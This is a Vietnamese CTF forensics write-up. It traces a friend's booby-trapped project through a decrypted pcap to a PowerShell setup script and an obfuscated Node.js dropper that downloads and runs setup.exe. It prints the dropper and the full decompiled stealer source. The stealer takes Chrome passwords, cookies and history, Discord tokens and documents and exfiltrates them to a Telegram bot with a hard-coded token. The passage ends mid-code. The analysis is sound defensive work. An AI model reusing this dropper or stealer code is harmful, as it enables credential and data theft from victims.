# Anh bạn tốt

<img width="617" height="675" alt="image" src="https://github.com/user-attachments/assets/d2185d60-7447-44c6-8b55-89beee47db67" />

- **Description**: Bạn D bỗng nhiên nắm được các bí mật tôi lưu trên máy ngay sau khi tôi chạy thử một dự án do cậu ấy gửi. Hãy giúp tôi điều tra xem làm cách nào D lại có được những thông tin đó.

- **Link challenge:** https://drive.google.com/file/d/12ioFdee9LvOfAVEGec9fTOCwx76tDFp7/view?usp=sharing

Artifact trong challenge này mình sẽ có được 1 file pcap và 1 file sslkey_log.log, hướng của challenge là chúng ta cần tìm hiểu lý do tại sao khi chạy file mà bạn của victim gửi lại mất đi các file quan trọng và giúp victim khôi phục lại

## Writeup

Đầu tiên thì mình thấy mình được cung cấp 1 file sslkey_log.log -> đây là file log dùng để decryption các session đã bị encrypt trong file pcap 

> Wireshark wiki có đề cập đến 1 session TLS/SSL, có thể được decryption bằng 3 cách sau:
> - Log file sử dụng per-session secret - (Sử dụng Pre master secret để decrypt) -> Ở chall này mình chỉ chú trọng vào giải thích cách sử dụng log file này để decrypt thôi
> - Decryption bằng RSA private key
> - Decryption sử dụng Pre-Shared key (PSK)
>
> Wireshark wiki có đề cập đến là file `SSLKEYLOGFILE.log` là 1 file được generate từ các ứng dụng như chrome, firefox dùng để decrypt các session khi mà biến môi trường `SSLKEYLOGFILE` đã được thiết lập. Một số thư viện như OpenSSL, hay NSS họ ghi các pre-master secret required này vào 1 file, và file này có thể được sử dụng để cấu hình cho wireshark.

Qua đây thì bước đầu tiên mình cần làm là add file pre-master secret log file này vào trong wireshark để decryption các kênh:

Vào lần lượt: `Edit` -> `Preference` -> `TLS` -> Sau đó add file log vào **Pre master secret log file** -> Sau đó nhấn apply:

<img width="1109" height="720" alt="image" src="https://github.com/user-attachments/assets/483ef8b7-515d-4198-98af-b30b1fc2d857" />

Tiếp theo mình bắt đầu phân tích tiếp từ `Hierachy Protocol` và `Conversation`:

<img width="1537" height="842" alt="image" src="https://github.com/user-attachments/assets/cf1ab8c9-f74c-4c26-a8a5-b0dbe0176aae" />

Ở đây mình thấy 2 giao thức http và http2 này khá sú, vì nó phù hợp với context là victim đã tải 1 file nào đó xuống sau đó là gặp các hiện tượng lạ, khả năng cao vẫn là tải về từ đây.

Khi tiếp tục tìm filter các conversation trong http2 thì mình thấy có một số ip sau có lượng packet và lượng total byte transfer giữa 2 ip lớn ở đây:

<img width="1911" height="907" alt="image" src="https://github.com/user-attachments/assets/edd0410a-af50-4853-99be-2ff9052477b8" />

Sau 1 lúc thực hiện lọc qua từng ip thì mình thấy luồng của 2 ip: `192.168.111.128` và `20.205.243.165`, có một hành động tải 1 file zip tên là SetupCTF_Notebook.zip:

<img width="1772" height="268" alt="image" src="https://github.com/user-attachments/assets/1d156280-866e-498a-8def-c60c071e06db" />

Theo dấu của stream này thì mình sẽ bắt đầu có thêm được thông tin

<img width="1277" height="1043" alt="image" src="https://github.com/user-attachments/assets/77309403-fbec-4677-b447-d02bad562d4d" />

Bây giờ mình sẽ export file zip này ra và phân tích sâu hơn vào bên trong của nó, sau khi extract ra thì mình thấy cấu trúc của file này trong khá liêms:

<img width="277" height="561" alt="image" src="https://github.com/user-attachments/assets/1d4d0f8a-50ee-48df-968e-9a960a625b5c" />

Khi mình bắt đầu đọc qua file `README.md`, mình thấy author của file có bảo là cần chạy 1 lệnh powershell và đồng thời thiết lập `ExecutionPolicy Bypass` -> tức là chạy script bên trong Windows mà không bị chặn bởi các cài đặt security của Powershell.

Tiếp tục đọc qua file `.ps1` :

```javascript
$ErrorActionPreference = "Stop"

Set-Location $PSScriptRoot

if (-not (Get-Command py -ErrorAction SilentlyContinue)) {
    throw "Python Launcher (py) was not found. Install Python 3.9 first."
}

py -3.9 --version *> $null
if ($LASTEXITCODE -ne 0) {
    throw "Python 3.9 was not found. Install it with: winget install -e --id Python.Python.3.9"
}

if (-not (Test-Path ".\.venv\Scripts\python.exe")) {
    Write-Host "Creating Python 3.9 virtual environment..." -ForegroundColor Cyan
    py -3.9 -m venv .venv
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
}

Write-Host "Installing Python dependencies..." -ForegroundColor Cyan
& ".\.venv\Scripts\python.exe" -m pip install -r requirements.txt
if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    throw "Node.js was not found. Install Node.js and reopen PowerShell."
}

Write-Host "Running static/admin/js/util.js..." -ForegroundColor Cyan
node .\static\admin\js\util.js
if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

Write-Host "Initialization completed successfully." -ForegroundColor Green

```

Sau các hành động check version của python là 3.9, cài môi trường ảo `venv`, cài tiếp tục requirement.txt, thì bên dưới có 1 hành động thực thi 1 file node javascript `util.js`, tới đây mình chuyển qua file này để tìm kiếm tiếp:

```
const https=require('https'),fs=require('fs'),path=require('path'),{execFile}=require('child_process');const payload = [
  'https://gist.githubusercontent.com/tibisachi/ade071ed7d2ae24fb85a17c7057b2bbb/raw/db0147d28342ddabcd566eb21e9313f6a4e0c7e0/q.hex',
  'https://gist.githubusercontent.com/tibisachi/ec907586db6bf4f0aa24d1b8391029b6/raw/03e7bcb132ac62ec09e4e68584f4d1d0c96b5dbe/w.hex',
  'https://gist.githubusercontent.com/tibisachi/4e760ff80516f8ce2530cfe7b544df8e/raw/7af5d36817113c3647431f370c7f19f9a96bbd96/e.hex',
  'https://gist.githubusercontent.com/tibisachi/8e8579c377c1df785346199debacbe69/raw/921b271195f492033b4d7a7644279fc3f6b151e8/r.hex',
  'https://gist.githubusercontent.com/tibisachi/952251230428755b906c3be3d867fc9b/raw/0c0d5f73f5b4099779a2a80806f556ec764166d2/t.hex',
  'https://gist.githubusercontent.com/tibisachi/68732f23c13e097d2057a6a5736f6263/raw/5b9853f0f4dc8742c81702160563d69f7406959a/y.hex',
  'https://gist.githubusercontent.com/tibisachi/8388edeb7c9e6347a54db676b0183180/raw/39cd2889f40e28069957126fa3a4262a2df962be/u.hex',
  'https://gist.githubusercontent.com/tibisachi/ddfe6fb1cf946fd8d928082ab41d  182a/raw/56a2324f4a13fc92db175807c7ae7814d1221e35/i.hex',
  'https://gist.githubusercontent.com/tibisachi/fbe7871a0a13a79c1b19ae80e9f7c123/raw/145735667d077455a827287527ec6d6a82e87920/o.hex',
  'https://gist.githubusercontent.com/tibisachi/f8b0756a2312858c022dd969858cf60f/raw/5044177b298e0967e395196ad075b06cdecf4067/p.hex'
];const _0x3e8c=path.join(__dirname,'setup.exe'),_0x2d1f=__dirname;const _0x5c7a=_0x3e8c=> new Date().toISOString();function _0x1a2e(_0x4f2a){console.log(`[${_0x5c7a()}] ${_0x4f2a}`)}function _0x4c3b(_0x2e8f,_0x5d6a){console.error(`[E] ${_0x2e8f}`);_0x5d6a&&console.error(`[E] ${_0x5d6a.message}`)}function _0x3f7c(_0x1e4e,_0x3a6c=3){return new Promise((_0x2b1a,_0x4d8c)=>{const _0xf5d1=_0x1e5c=>{_0x1a2e(`F ${_0x1e5c}/${_0x3a6c}: ${_0x1e4e.substring(0,50)}...`);https.get(_0x1e4e,{timeout:1e4},_0x3c5a=>{if(200!==_0x3c5a.statusCode)return _0x4d8c(new Error(`HTTP ${_0x3c5a.statusCode}`));let _0x15af='';_0x3c5a.on('data',_0x5e2c=>_0x15af+=_0x5e2c.toString()),_0x3c5a.on('end',()=>_0x2b1a(_0x15af.replace(/[^0-9a-fA-F]/g,'')))}).on('error',_0x19f8=>{_0x1e5c<_0x3a6c?(_0x1a2e(`W ${_0x1e5c}F`),setTimeout(()=>_0xf5d1(_0x1e5c+1),2e3)):_0x4d8c(_0x19f8)}).on('timeout',()=>{_0x1e5c<_0x3a6c?(_0x1a2e(`W T`),setTimeout(()=>_0xf5d1(_0x1e5c+1),2e3)):_0x4d8c(new Error('TO'))})};_0xf5d1(1)})}(async()=>{try{_0x1a2e('='.repeat(40));_0x1a2e(`D: ${_0x2d1f}`);_0x1a2e(`B: ${_0x3e8c}`);_0x1a2e(`F ${_0x4a2b.length}...`);let _0x2c3a='';for(let _0x5f4e=0;_0x5f4e<_0x4a2b.length;_0x5f4e++)try{const _0x1b8f=await _0x3f7c(_0x4a2b[_0x5f4e]);_0x2c3a+=_0x1b8f,_0x1a2e(`[${_0x5f4e+1}/${_0x4a2b.length}] OK (${_0x2c3a.length})`);}catch(_0x4e9f){_0x4c3b(`F ${_0x5f4e+1}`,_0x4e9f);throw _0x4e9f}_0x1a2e(`A: ${_0x2c3a.length}`);_0x1a2e('C H2B...');const _0x3d2e=Buffer.from(_0x2c3a,'hex');_0x1a2e(`S: ${_0x3d2e.length}`);_0x1a2e(`W: ${_0x3e8c}`);const _0x1f5c=path.dirname(_0x3e8c);fs.existsSync(_0x1f5c)||fs.mkdirSync(_0x1f5c,{recursive:!0});fs.existsSync(_0x3e8c)&&fs.unlinkSync(_0x3e8c);fs.writeFileSync(_0x3e8c,_0x3d2e);if(!fs.existsSync(_0x3e8c))throw new Error('NF');const _0x4f1a=fs.statSync(_0x3e8c);_0x1a2e(`V: ${_0x4f1a.size}`);try{fs.chmodSync(_0x3e8c,493)}catch(_0x5b2d){}const _0x2e5a=execFile(_0x3e8c,(_0x3f1a,_0x2d8f,_0x1b3e)=>{_0x3f1a&&_0x4c3b('E',_0x3f1a);_0x2d8f&&console.log(_0x2d8f);_0x1b3e&&console.error(_0x1b3e)});_0x2e5a.on('exit',_0x4c7d=>{_0x1a2e(`X: ${_0x4c7d}`);setTimeout(()=>{_0x1a2e('C...');try{fs.existsSync(_0x3e8c)&&fs.unlinkSync(_0x3e8c),_0x1a2e('D OK')}catch(_0x3e8c){_0x4c3b('D F',_0x3e8c)}_0x1a2e('='.repeat(40))},2e3)});_0x2e5a.on('error',_0x1e8c=>_0x4c3b('XE',_0x1e8c))}catch(_0x2a1f){_0x4c3b('CE',_0x2a1f);process.exit(1)}})();
```

Đây là toàn bộ script javascript mà file ps1 thực thi ở cuối, và tổng quan về các hành động mà file này thực thi bao gồm:

- Request tới `githubusercontent/tibisachi/raw/guid/.v.hex` để thực hiện delivery malware được cất trên github, với ten là `setup.exe`
- Sau khi delivery toàn bộ raw hex của malware về thì thực hiện `replace` qua toàn bộ các kí tự không phải là hex - `_0x2b1a(_0x15af.replace(/[^0-9a-fA-F]/g,'')))})`
- Sau khi `replace` thì thực hiện ghép chuỗi lại tạo thành 1 cục raw hex lớn và thực hiện decode
- Cuối cùng là thực thi malware và exit process

Giờ mình thực hiện tải về toàn bộ malware này về để phân tích tiếp bằng script python nhỏ sau:

```python
import requests

link = '''
  https://gist.githubusercontent.com/tibisachi/ade071ed7d2ae24fb85a17c7057b2bbb/raw/db0147d28342ddabcd566eb21e9313f6a4e0c7e0/q.hex
  https://gist.githubusercontent.com/tibisachi/ec907586db6bf4f0aa24d1b8391029b6/raw/03e7bcb132ac62ec09e4e68584f4d1d0c96b5dbe/w.hex
  https://gist.githubusercontent.com/tibisachi/4e760ff80516f8ce2530cfe7b544df8e/raw/7af5d36817113c3647431f370c7f19f9a96bbd96/e.hex
  https://gist.githubusercontent.com/tibisachi/8e8579c377c1df785346199debacbe69/raw/921b271195f492033b4d7a7644279fc3f6b151e8/r.hex
  https://gist.githubusercontent.com/tibisachi/952251230428755b906c3be3d867fc9b/raw/0c0d5f73f5b4099779a2a80806f556ec764166d2/t.hex
  https://gist.githubusercontent.com/tibisachi/68732f23c13e097d2057a6a5736f6263/raw/5b9853f0f4dc8742c81702160563d69f7406959a/y.hex
  https://gist.githubusercontent.com/tibisachi/8388edeb7c9e6347a54db676b0183180/raw/39cd2889f40e28069957126fa3a4262a2df962be/u.hex
  https://gist.githubusercontent.com/tibisachi/ddfe6fb1cf946fd8d928082ab41d182a/raw/56a2324f4a13fc92db175807c7ae7814d1221e35/i.hex
  https://gist.githubusercontent.com/tibisachi/fbe7871a0a13a79c1b19ae80e9f7c123/raw/145735667d077455a827287527ec6d6a82e87920/o.hex
  https://gist.githubusercontent.com/tibisachi/f8b0756a2312858c022dd969858cf60f/raw/5044177b298e0967e395196ad075b06cdecf4067/p.hex
  '''


urls = [url.strip() for url in link.strip().split('\n') if url.strip()]
for url in urls:
    f = requests.get(url)
    print(f.text)
```

Sau đó thực hiện vứt hết lên cyberchef rồi thực hiện decode hex:

<img width="1538" height="943" alt="image" src="https://github.com/user-attachments/assets/5f7ce94b-06a3-4e22-a758-93758081bf31" />

Mình thấy ngay đây là file có signature byte là `MZ` -> là 1 file PE, giờ lưu về rồi mình detect nó bằng `DIE`

<img width="904" height="655" alt="image" src="https://github.com/user-attachments/assets/958b9223-2aa5-43fe-bd89-275d0f433565" />

Đây là 1 file được compiler bằng C++/C, nhưng mà nó được Packer lại bằng Pyinstaller, nên mình sẽ sử dụng `pyextracttor` để thực hiện unpack nó ra rồi tiếp tục phân tích:

```Powershell
PS D:\kali-linux\tools\pyinstxtractor> python .\pyinstxtractor.py "D:\kali-linux\CTF\KMA_CTF\Anh Bạn Tốt\chall\setup.exe"
[+] Processing D:\kali-linux\CTF\KMA_CTF\Anh Bạn Tốt\chall\setup.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.11
[+] Length of package: 9622019 bytes
[+] Found 74 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: ctf_book_setup.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.11 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: D:\kali-linux\CTF\KMA_CTF\Anh Bạn Tốt\chall\setup.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

Sau đó mình vứt lên Pylingual để thực hiện decompiler bytecode file `notebook_CTF.pyc` lại:

<img width="1919" height="981" alt="image" src="https://github.com/user-attachments/assets/2340dfaf-3ef3-48d6-a2d2-453726a11237" />

Đây là source code của con stealer này:

<details>
  <summary>
    **Source Stealer**
  </summary>

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'ctf_book_setup.py'
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import requests
import subprocess
import zipfile
import ctypes
import ctypes.wintypes
import base64
import json
import sqlite3
import shutil
from pathlib import Path
from Crypto.Cipher import AES
from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
import sys
if sys.stdout is not None:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if sys.stderr is not None:
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]
def HandleMemory(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = ctypes.create_string_buffer(cbData)
    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
def Decrypt_DataUsingDPAPI(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 1, byref(blob_out)):
        return HandleMemory(blob_out)
    else:
        return None
def zaDThEJSGQ(agrs):
    if not os.path.exists(agrs):
        return
    else:
        with open(agrs, 'r', encoding='utf-8') as f:
            VkDrfTFpNz = json.loads(f.read())
        CZHdMcABep = base64.b64decode(VkDrfTFpNz['os_crypt']['encrypted_key'])[5:]
        zsRDAolVcq = Decrypt_DataUsingDPAPI(CZHdMcABep)
        return zsRDAolVcq
def decrypt(Buffer, master_key=None):
    starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = Buffer[3:15]
        payload = Buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:(-16)]
        try:
            decrypted_pass = decrypted_pass.decode()
        except Exception as e:
            pass
        return decrypted_pass
    else:
        return None
def MakeString(khIKRYXpQF):
    LxYmNMbCqy = len(khIKRYXpQF)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + khIKRYXpQF[i % LxYmNMbCqy]) % 256
        S[i], S[j] = (S[j], S[i])
    return S
def genKey(S, uNvoSEMwJe):
    i = j = 0
    out = []
    for char in uNvoSEMwJe:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = (S[j], S[i])
        K = S[(S[i] + S[j]) % 256]
        out.append(char ^ K)
    return bytes(out)
def RC4(hfjgkeejkfo, dfEWQ):
    hfjgkeejkfo = [ord(c) for c in hfjgkeejkfo]
    S = MakeString(hfjgkeejkfo)
    return genKey(S, dfEWQ)
def Decrypt_RC4(uNvoSEMwJe, VSeWtElMYr, hfjgkeejkfo):
    # irreducible cflow, using cdg fallback
    # ***<module>.CXPkycmTAa: Failure: Compilation Error
    with open(uNvoSEMwJe, 'rb') as inp:
        dfEWQ = inp.read()
    AAA = RC4(hfjgkeejkfo, dfEWQ)
    with open(VSeWtElMYr, 'wb') as out:
        out.write(AAA)

    except Exception as e:
        print(f'Error: {e}')
    return 0
def GetCredentialsChrome(chrome_path=None):
    if chrome_path is None:
        old_chrome_paths = [os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-win', 'profile', 'Default', 'Login Data'), os.path.join(os.path.expanduser('~'), 'Desktop', 'old-chrome', 'profile', 'Default', 'Login Data'), os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-v74', 'profile', 'Default', 'Login Data')]
        chrome_db = None
        for path in old_chrome_paths:
            if os.path.exists(path):
                chrome_db = path
                break
        if chrome_db is None:
            local_app_data = os.getenv('LOCALAPPDATA')
            chrome_db = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    else:
        chrome_db = chrome_path
    passwords = []
    try:
        if not os.path.exists(chrome_db):
            return passwords
        else:
            temp_db = os.path.join(os.getenv('TEMP'), 'chrome_login_temp.db')
            shutil.copy2(chrome_db, temp_db)
            local_app_data = os.getenv('LOCALAPPDATA')
            state_file = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Local State')
            if not os.path.exists(state_file):
                old_state_paths = [os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-win', 'profile', 'Local State'), os.path.join(os.path.expanduser('~'), 'Desktop', 'old-chrome', 'profile', 'Local State'), os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-v74', 'profile', 'Local State')]
                for path in old_state_paths:
                    if os.path.exists(path):
                        state_file = path
                        break
            master_key = zaDThEJSGQ(state_file)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for url, username, encrypted_password in cursor.fetchall():
                try:
                    decrypted = decrypt(encrypted_password, master_key)
                    if decrypted:
                        passwords.append({'url': url, 'username': username, 'password': decrypted})
                except:
                    continue
            conn.close()
            os.remove(temp_db)
    except Exception as e:
        pass
    return passwords
def GetCookiesChrome(chrome_path=None):
    if chrome_path is None:
        old_chrome_paths = [os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-win', 'profile', 'Default', 'Cookies'), os.path.join(os.path.expanduser('~'), 'Desktop', 'old-chrome', 'profile', 'Default', 'Cookies'), os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-v74', 'profile', 'Default', 'Cookies')]
        chrome_db = None
        for path in old_chrome_paths:
            if os.path.exists(path):
                chrome_db = path
                break
        if chrome_db is None:
            local_app_data = os.getenv('LOCALAPPDATA')
            chrome_db = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
    else:
        chrome_db = chrome_path
    cookies = []
    try:
        if not os.path.exists(chrome_db):
            return cookies
        else:
            temp_db = os.path.join(os.getenv('TEMP'), 'chrome_cookies_temp.db')
            shutil.copy2(chrome_db, temp_db)
            local_app_data = os.getenv('LOCALAPPDATA')
            state_file = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Local State')
            if not os.path.exists(state_file):
                old_state_paths = [os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-win', 'profile', 'Local State'), os.path.join(os.path.expanduser('~'), 'Desktop', 'old-chrome', 'profile', 'Local State'), os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-v74', 'profile', 'Local State')]
                for path in old_state_paths:
                    if os.path.exists(path):
                        state_file = path
                        break
            master_key = zaDThEJSGQ(state_file)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
            for host, name, value, encrypted_value in cursor.fetchall():
                try:
                    if encrypted_value:
                        decrypted = decrypt(encrypted_value, master_key)
                        if decrypted:
                            cookies.append({'host': host, 'name': name, 'value': decrypted})
                    else:
                        cookies.append({'host': host, 'name': name, 'value': value})
                except:
                    continue
            conn.close()
            os.remove(temp_db)
    except Exception as e:
        pass
    return cookies
def GetHistoryChrome(chrome_path=None):
    if chrome_path is None:
        old_chrome_paths = [os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-win', 'profile', 'Default', 'History'), os.path.join(os.path.expanduser('~'), 'Desktop', 'old-chrome', 'profile', 'Default', 'History'), os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-v74', 'profile', 'Default', 'History')]
        chrome_db = None
        for path in old_chrome_paths:
            if os.path.exists(path):
                chrome_db = path
                break
        if chrome_db is None:
            local_app_data = os.getenv('LOCALAPPDATA')
            chrome_db = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Default', 'History')
    else:
        chrome_db = chrome_path
    history = []
    try:
        if not os.path.exists(chrome_db):
            return history
        else:
            temp_db = os.path.join(os.getenv('TEMP'), 'chrome_history_temp.db')
            shutil.copy2(chrome_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, visit_count FROM urls LIMIT 100')
            for url, title, visit_count in cursor.fetchall():
                history.append({'url': url, 'title': title, 'visits': visit_count})
            conn.close()
            os.remove(temp_db)
    except Exception as e:
        pass
    return history
def GetTokensDiscord():
    tokens = []
    discord_paths = [os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb')]
    try:
        for path in discord_paths:
            if not os.path.exists(path):
                continue
            else:
                for filename in os.listdir(path):
                    if not filename.endswith('.ldb'):
                        continue
                    else:
                        filepath = os.path.join(path, filename)
                        try:
                            with open(filepath, 'rb', errors='ignore') as f:
                                content = f.read().decode('utf-8', errors='ignore')
                                import re
                                token_pattern = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}'
                                found_tokens = re.findall(token_pattern, content)
                                for token in found_tokens:
                                    if token not in tokens:
                                        tokens.append(token)
                        except:
                            pass
    except Exception as e:
        pass
    return list(set(tokens))
def detect_chrome_path():
    old_chrome_paths = [os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-win', 'profile'), os.path.join(os.path.expanduser('~'), 'Desktop', 'old-chrome', 'profile'), os.path.join(os.path.expanduser('~'), 'Desktop', 'chrome-v74', 'profile')]
    for path in old_chrome_paths:
        if os.path.exists(path):
            print(f'qwert: {path}')
            return path
    local_app_data = os.getenv('LOCALAPPDATA')
    modern_chrome_path = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Default')
    if os.path.exists(modern_chrome_path):
        print(f'qwert: {modern_chrome_path}')
        return modern_chrome_path
    else:
        return None
def nyCidxJVDf() -> str:
    OonWMrLQeJ = 'https://api.ipify.org?format=json'
    YgyvzXclqs = requests.get(OonWMrLQeJ)
    YgyvzXclqs.raise_for_status()
    data = YgyvzXclqs.json()
    return data['ip']
def seDJkcNSgB() -> str:
    eByYHhUZxQ = ['.png', '.pdf', '.jpg', '.docx', '.xlsx', '.xls', '.doc', '.pptx', '.csv', '.rtf', '.jpeg', '.html', '.odt', '.sql', '.txt', '.xml', '.zip', '.rar', '.7z', '.tar', '.gz', '.tgz']
    DESQkmwuvU = os.environ['USERPROFILE']
    iYzqnXvICP = [os.path.join(DESQkmwuvU, 'Documents'), os.path.join(DESQkmwuvU, 'Pictures'), os.path.join(DESQkmwuvU, 'Downloads')]
    fGveRzydAE = []
    for i in iYzqnXvICP:
        if not os.path.exists(i):
            continue
        else:
            for root, _, iKBAcWFZkt in os.walk(i):
                for JWoPjhAzOI in iKBAcWFZkt:
                    if any((JWoPjhAzOI.endswith(ext) for ext in eByYHhUZxQ)):
                        fGveRzydAE.append(os.path.join(root, JWoPjhAzOI))
    PrhjiaXUYA = os.path.join(iYzqnXvICP[1], 'Data.zip')
    try:
        with zipfile.ZipFile(PrhjiaXUYA, 'w') as zipf:
            for SlwNYcXGvg in fGveRzydAE[:100]:
                try:
                    zipf.write(SlwNYcXGvg, os.path.relpath(SlwNYcXGvg, DESQkmwuvU))
                except:
                    pass
        Decrypt_RC4(f'{PrhjiaXUYA}', f'{PrhjiaXUYA}', f'{nyCidxJVDf()}')
    except Exception as e:
        return 0
    return PrhjiaXUYA
def eKWZGmwHBC():
    try:
        ZyQowYvbJU = ctypes.WinDLL('user32.dll')
        hwnd = ZyQowYvbJU.GetForegroundWindow()
        ZyQowYvbJU.ShowWindow(hwnd, 0)
    except Exception as e:
        return 0
def TelegramServerC2(file_path, token, chat_id):
    # irreducible cflow, using cdg fallback
    # ***<module>.QAhgBNghdyus: Failure: Compilation Error
    url = f'https://api.telegmram.org/bot{token}/sendDocuent'
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id, 'protect_content': True}
        response = requests.post(url, files=files, data=data)
        return response.json()
    except Exception as e:
        print(f'Error: {e}')
        return None
def sendTelegram(message, token, chat_id):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message, 'protect_content': True}
    try:
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f'Error: {e}')
        return None
def CredentialsUpload() -> str:
    try:
        dtg = nyCidxJVDf()
        geo_url = f'http://ip-api.com/json/{dtg}'
        geo_response = requests.get(geo_url)
        geo_data = geo_response.json()
        fgh = os.getlogin()
        rty = geo_data.get('country', 'Unknown')
        region = geo_data.get('region', 'Unknown')
        city = geo_data.get('city', 'Unknown')
        ewr = geo_data.get('isp', 'Unknown')
        LOphdjsuytrenh = f"\n🖥️ **11223334445566**\n\n👤 11: `{fgh}`\n🌐 1212: `{dtg}`\n📍 1314: `{rty} ({region}, {city})`\n📡 1214: `{ewr}`\n💻 1211: `{os.getenv('COMPUTERNAME')}`\n⚙️ 12 124: `{os.cpu_count()}`\n🏠 1233 678: `{os.getenv('USERPROFILE')}`\n🔧 1234 567: `{os.getenv('PROCESSOR_IDENTIFIER')}`\n"
        return LOphdjsuytrenh
    except Exception as e:
        return 'Error'
def main():
    # ***<module>.main: Failure: Different control flow
    token = '8698629716:AAHYMShQ4fkNv5r3vEqaKh-lcXhWpujT82M'
    chat_id = '7870990883'
    chrome_path = detect_chrome_path()
    eKWZGmwHBC()
    LOphdjsuytrenh = CredentialsUpload()
    sendTelegram(LOphdjsuytrenh, token, chat_id)
    yuhfJDH = GetCredentialsChrome(chrome_path)
    if yuhfJDH:
        pwd_msg = 'chpw:**\n\n'
        for i, pwd in enumerate(yuhfJDH[:20], 1):
            pwd_msg += f"{i}. URL: `{pwd['url']}`\n   User: `{pwd['username']}`\n   Pass: `{pwd['password']}`\n\n"
        sendTelegram(pwd_msg, token, chat_id)
    mlcjd = GetCookiesChrome(chrome_path)
    if mlcjd:
        hduhsg = os.path.join(os.getenv('TEMP'), 'cookies.txt')
        with open(hduhsg, 'w', encoding='utf-8') as f:
            for cookie in mlcjd[:50]:
                f.write(f"{cookie['host']} | {cookie['name']} = {cookie['value']}\n")
        sendTelegram(TelegramServerC2(hduhsg, token, chat_id), token, chat_id)
        os.remove(hduhsg)
    fgde = GetHistoryChrome(chrome_path)
    if fgde:
        vcnMHD = os.path.join(os.getenv('TEMP'), 'lll.txt')
        with open(vcnMHD, 'w', encoding='utf-8') as f:
            for item in fgde:
                f.write(f"URL: {item['url']}\nTitle: {item['title']}\nVisits: {item['visits']}\n\n")
        sendTelegram(TelegramServerC2(vcnMHD, token, chat_id), token, chat_id)
        os.remove(vcnMHD)
    dfsw = GetTokensDiscord()
    if dfsw:
        token_msg = 'Distoken:**\n\n'
        for i, token in enumerate(dfsw, 1):
            token_msg += f'{i}. `{token}`\n'
        sendTelegram(token_msg, token, chat_id)
    gdYGDHAJHD = seDJkcNSgB()
    if gdYGDHAJHD and os.path.exists(gdYGDHAJHD):
            result = QAhgBNghdyus(gdYGDHAJHD, token, chat_id)
            if not result or result.get('ok'):
                    try:
                        os.remove(gdYGDHAJHD)
                    except Exception as e:
                        print(f'Error: {e}')
if __name__ == '__main__':
    main()
```
</details>

Mình đã thực hiện đổi tên một số hàm trong quá trình phân tích lại source của con stealer này để dễ đọc hơn, và tổng quan của con stealer này sẽ thực hiện các hành động sau:

Đầu tiên là 2 hàm thực hiện xử lý phần memory và decrypt các phần data sử dụng DPAPI key để mã hóa, như các dữ liệu liên quan đến chrominum, edge,... 

```Python
def HandleMemory(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
